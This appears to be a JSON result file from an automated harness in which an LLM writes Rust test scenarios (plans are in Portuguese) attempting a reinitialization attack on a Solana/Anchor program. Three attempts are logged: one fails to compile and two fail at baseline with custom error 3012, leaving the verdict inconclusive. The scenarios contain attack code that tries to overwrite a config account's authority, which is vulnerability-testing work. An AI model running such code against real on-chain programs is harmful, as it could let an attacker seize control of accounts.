@@ -1,0 +1,129 @@
+{
+  "category": "REINIT",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Failure(Custom(3012))",
+  "reason": "o baseline 'init legitimo' falhou com Failure(Custom(3012)); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 1689,
+        "completion_tokens": 783,
+        "latency_s": 4.02
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta Config já inicializada com authority e is_initialized=true, e uma nova authority atacante. O baseline chama init legitimamente para criar a conta Config (usando empty_account e system_program). O ataque chama init novamente na mesma conta já inicializada, com a authority atacante, tentando sobrescrever o estado. O efeito verifica se a authority foi alterada para a atacante e se is_initialized permaneceu true, indicando reinicialização bem-sucedida.\",\n  \"scenario\": \"let program_id = env.program_id;\\nlet authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta Config vazia para o baseline (init)\\nlet config_key = Pubkey::new_unique();\\nlet config_account = empty_account();\\n\\n// Contas para o baseline\\nlet (system_program, system_account) = system_program_account();\\nlet baseline_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program, system_account.clone()),\\n];\\n\\n// Metas para o baseline\\nlet baseline_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet baseline_ix = env.anchor_ix(\\\"init\\\", &(), baseline_metas);\\nlet baseline_result = env.baseline(\\\"init legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Extrair a conta Config resultante do baseline\\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\\n    .find(|(k, _)| *k == config_key)\\n    .map(|(_, acc)| acc.clone())\\n    .expect(\\\"conta config nao encontrada apos baseline\\\");\\n\\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\\nlet attack_accounts = vec![\\n    (config_key, config_after_baseline.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n    (system_program, system_account),\\n];\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(attacker, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet attack_ix = env.anchor_ix(\\\"init\\\", &(), attack_metas);\\nlet attack_result = env.attack(\\\"reinit com authority atacante\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\\n    env.effect(\\\"authority sobrescrita para atacante\\\", stored_authority == attacker);\\n    env.effect(\\\"is_initialized permanece true\\\", is_initialized);\\n}\"\n}",
+      "plan": "Preparamos uma conta Config já inicializada com authority e is_initialized=true, e uma nova authority atacante. O baseline chama init legitimamente para criar a conta Config (usando empty_account e system_program). O ataque chama init novamente na mesma conta já inicializada, com a authority atacante, tentando sobrescrever o estado. O efeito verifica se a authority foi alterada para a atacante e se is_initialized permaneceu true, indicando reinicialização bem-sucedida.",
+      "scenario": "let program_id = env.program_id;\nlet authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta Config vazia para o baseline (init)\nlet config_key = Pubkey::new_unique();\nlet config_account = empty_account();\n\n// Contas para o baseline\nlet (system_program, system_account) = system_program_account();\nlet baseline_accounts = vec![\n    (config_key, config_account.clone()),\n    (authority, wallet(1_000_000_000)),\n    (system_program, system_account.clone()),\n];\n\n// Metas para o baseline\nlet baseline_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet baseline_ix = env.anchor_ix(\"init\", &(), baseline_metas);\nlet baseline_result = env.baseline(\"init legitimo\", &baseline_ix, &baseline_accounts);\n\n// Extrair a conta Config resultante do baseline\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\n    .find(|(k, _)| *k == config_key)\n    .map(|(_, acc)| acc.clone())\n    .expect(\"conta config nao encontrada apos baseline\");\n\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\nlet attack_accounts = vec![\n    (config_key, config_after_baseline.clone()),\n    (attacker, wallet(1_000_000_000)),\n    (system_program, system_account),\n];\n\nlet attack_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(attacker, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet attack_ix = env.anchor_ix(\"init\", &(), attack_metas);\nlet attack_result = env.attack(\"reinit com authority atacante\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\n    env.effect(\"authority sobrescrita para atacante\", stored_authority == attacker);\n    env.effect(\"is_initialized permanece true\", is_initialized);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:32:45\n   |\n32 |     let baseline_ix = env.anchor_ix(\"init\", &(), baseline_metas);\n   |                           ---------         ^^^ expected `&[u8]`, found `&()`\n   |                           |\n   |                           arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:54:43\n   |\n54 |     let attack_ix = env.anchor_ix(\"init\", &(), attack_metas);\n   |                         ---------         ^^^ expected `&[u8]`, found `&()`\n   |                         |\n   |                         arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:32:45\n   |\n32 |     let baseline_ix = env.anchor_ix(\"init\", &(), baseline_metas);\n   |                           ---------         ^^^ expected `&[u8]`, found `&()`\n   |                           |\n   |                           arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:54:43\n   |\n54 |     let attack_ix = env.anchor_ix(\"init\", &(), attack_metas);\n   |                         ---------         ^^^ expected `&[u8]`, found `&()`\n   |                         |\n   |                         arguments to this method are incorrect\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\n  --> src/lib.rs:98:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2585,
+        "completion_tokens": 774,
+        "latency_s": 3.77
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta Config vazia (empty_account) e uma authority legitima. Chamo init legitimamente para inicializar a conta, obtendo o estado pos-baseline. No ataque, chamo init novamente na mesma conta ja inicializada, mas com uma authority atacante, para tentar sobrescrever o estado. O efeito mede se a authority armazenada foi alterada para o atacante e se is_initialized continua true, demonstrando reinitialization.\",\n  \"scenario\": \"let program_id = env.program_id;\\nlet authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta Config vazia para o baseline (init)\\nlet config_key = Pubkey::new_unique();\\nlet config_account = empty_account();\\n\\n// Contas para o baseline\\nlet (system_program, system_account) = system_program_account();\\nlet baseline_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program, system_account.clone()),\\n];\\n\\n// Metas para o baseline\\nlet baseline_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet baseline_ix = env.anchor_ix(\\\"init\\\", &[], baseline_metas);\\nlet baseline_result = env.baseline(\\\"init legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Extrair a conta Config resultante do baseline\\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\\n    .find(|(k, _)| *k == config_key)\\n    .map(|(_, acc)| acc.clone())\\n    .expect(\\\"conta config nao encontrada apos baseline\\\");\\n\\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\\nlet attack_accounts = vec![\\n    (config_key, config_after_baseline.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n    (system_program, system_account),\\n];\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(attacker, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet attack_ix = env.anchor_ix(\\\"init\\\", &[], attack_metas);\\nlet attack_result = env.attack(\\\"reinit com authority atacante\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\\n    env.effect(\\\"authority sobrescrita para atacante\\\", stored_authority == attacker);\\n    env.effect(\\\"is_initialized permanece true\\\", is_initialized);\\n}\"\n}",
+      "plan": "Preparo uma conta Config vazia (empty_account) e uma authority legitima. Chamo init legitimamente para inicializar a conta, obtendo o estado pos-baseline. No ataque, chamo init novamente na mesma conta ja inicializada, mas com uma authority atacante, para tentar sobrescrever o estado. O efeito mede se a authority armazenada foi alterada para o atacante e se is_initialized continua true, demonstrando reinitialization.",
+      "scenario": "let program_id = env.program_id;\nlet authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta Config vazia para o baseline (init)\nlet config_key = Pubkey::new_unique();\nlet config_account = empty_account();\n\n// Contas para o baseline\nlet (system_program, system_account) = system_program_account();\nlet baseline_accounts = vec![\n    (config_key, config_account.clone()),\n    (authority, wallet(1_000_000_000)),\n    (system_program, system_account.clone()),\n];\n\n// Metas para o baseline\nlet baseline_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet baseline_ix = env.anchor_ix(\"init\", &[], baseline_metas);\nlet baseline_result = env.baseline(\"init legitimo\", &baseline_ix, &baseline_accounts);\n\n// Extrair a conta Config resultante do baseline\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\n    .find(|(k, _)| *k == config_key)\n    .map(|(_, acc)| acc.clone())\n    .expect(\"conta config nao encontrada apos baseline\");\n\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\nlet attack_accounts = vec![\n    (config_key, config_after_baseline.clone()),\n    (attacker, wallet(1_000_000_000)),\n    (system_program, system_account),\n];\n\nlet attack_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(attacker, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet attack_ix = env.anchor_ix(\"init\", &[], attack_metas);\nlet attack_result = env.attack(\"reinit com authority atacante\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\n    env.effect(\"authority sobrescrita para atacante\", stored_authority == attacker);\n    env.effect(\"is_initialized permanece true\", is_initialized);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo",
+            "result": "Failure(Custom(3012))",
+            "compute_units": 2852,
+            "account_flags": "sw,sr,-r"
+          },
+          {
+            "step": "attack",
+            "note": "reinit com authority atacante",
+            "result": "Failure(Custom(3012))",
+            "compute_units": 2852,
+            "account_flags": "sw,sr,-r"
+          }
+        ],
+        "runtime_trace": [
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 2852 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg failed: custom program error: 0xbc4",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 2852 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg failed: custom program error: 0xbc4"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'init legitimo' falhou com Failure(Custom(3012)); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2367,
+        "completion_tokens": 790,
+        "latency_s": 3.91
+      },
+      "raw": "{\"plan\": \"O baseline precisa criar a conta Config via System Program antes de chamar init, pois o Anchor exige que a conta seja criada e inicializada na mesma instrucao (constraint init). Vou montar a conta Config como empty_account, incluir o System Program e marcar config como signer e writable. O ataque chama init novamente na mesma conta ja inicializada com um authority atacante, tentando sobrescrever o estado. O efeito mede se o authority armazenado foi alterado para o atacante e se is_initialized continua true.\", \"scenario\": \"let program_id = env.program_id;\\nlet authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta Config vazia para o baseline (init)\\nlet config_key = Pubkey::new_unique();\\nlet config_account = empty_account();\\n\\n// Contas para o baseline\\nlet (system_program, system_account) = system_program_account();\\nlet baseline_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n    (system_program, system_account.clone()),\\n];\\n\\n// Metas para o baseline\\nlet baseline_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet baseline_ix = env.anchor_ix(\\\"init\\\", &[], baseline_metas);\\nlet baseline_result = env.baseline(\\\"init legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Extrair a conta Config resultante do baseline\\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\\n    .find(|(k, _)| *k == config_key)\\n    .map(|(_, acc)| acc.clone())\\n    .expect(\\\"conta config nao encontrada apos baseline\\\");\\n\\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\\nlet attack_accounts = vec![\\n    (config_key, config_after_baseline.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n    (system_program, system_account),\\n];\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(attacker, true),\\n    AccountMeta::new_readonly(system_program, false),\\n];\\n\\nlet attack_ix = env.anchor_ix(\\\"init\\\", &[], attack_metas);\\nlet attack_result = env.attack(\\\"reinit com authority atacante\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let config_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\\n    env.effect(\\\"authority sobrescrita para atacante\\\", stored_authority == attacker);\\n    env.effect(\\\"is_initialized permanece true\\\", is_initialized);\\n}\\n\"}",
+      "plan": "O baseline precisa criar a conta Config via System Program antes de chamar init, pois o Anchor exige que a conta seja criada e inicializada na mesma instrucao (constraint init). Vou montar a conta Config como empty_account, incluir o System Program e marcar config como signer e writable. O ataque chama init novamente na mesma conta ja inicializada com um authority atacante, tentando sobrescrever o estado. O efeito mede se o authority armazenado foi alterado para o atacante e se is_initialized continua true.",
+      "scenario": "let program_id = env.program_id;\nlet authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta Config vazia para o baseline (init)\nlet config_key = Pubkey::new_unique();\nlet config_account = empty_account();\n\n// Contas para o baseline\nlet (system_program, system_account) = system_program_account();\nlet baseline_accounts = vec![\n    (config_key, config_account.clone()),\n    (authority, wallet(1_000_000_000)),\n    (system_program, system_account.clone()),\n];\n\n// Metas para o baseline\nlet baseline_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet baseline_ix = env.anchor_ix(\"init\", &[], baseline_metas);\nlet baseline_result = env.baseline(\"init legitimo\", &baseline_ix, &baseline_accounts);\n\n// Extrair a conta Config resultante do baseline\nlet config_after_baseline = baseline_result.resulting_accounts.iter()\n    .find(|(k, _)| *k == config_key)\n    .map(|(_, acc)| acc.clone())\n    .expect(\"conta config nao encontrada apos baseline\");\n\n// Ataque: chamar init novamente na mesma conta ja inicializada, com authority atacante\nlet attack_accounts = vec![\n    (config_key, config_after_baseline.clone()),\n    (attacker, wallet(1_000_000_000)),\n    (system_program, system_account),\n];\n\nlet attack_metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(attacker, true),\n    AccountMeta::new_readonly(system_program, false),\n];\n\nlet attack_ix = env.anchor_ix(\"init\", &[], attack_metas);\nlet attack_result = env.attack(\"reinit com authority atacante\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let config_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(config_data, 8); // offset 8 apos discriminador\n    let is_initialized = config_data[40] != 0; // offset 8 + 32 = 40\n    env.effect(\"authority sobrescrita para atacante\", stored_authority == attacker);\n    env.effect(\"is_initialized permanece true\", is_initialized);\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo",
+            "result": "Failure(Custom(3012))",
+            "compute_units": 2852,
+            "account_flags": "sw,sr,-r"
+          },
+          {
+            "step": "attack",
+            "note": "reinit com authority atacante",
+            "result": "Failure(Custom(3012))",
+            "compute_units": 2852,
+            "account_flags": "sw,sr,-r"
+          }
+        ],
+        "runtime_trace": [
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 2852 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg failed: custom program error: 0xbc4",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 2852 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg failed: custom program error: 0xbc4"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'init legitimo' falhou com Failure(Custom(3012)); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SSP-04-A-V",
+  "static_finding": {
+    "category": "REINIT",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Reinitialization Attacks."
+  }
+}
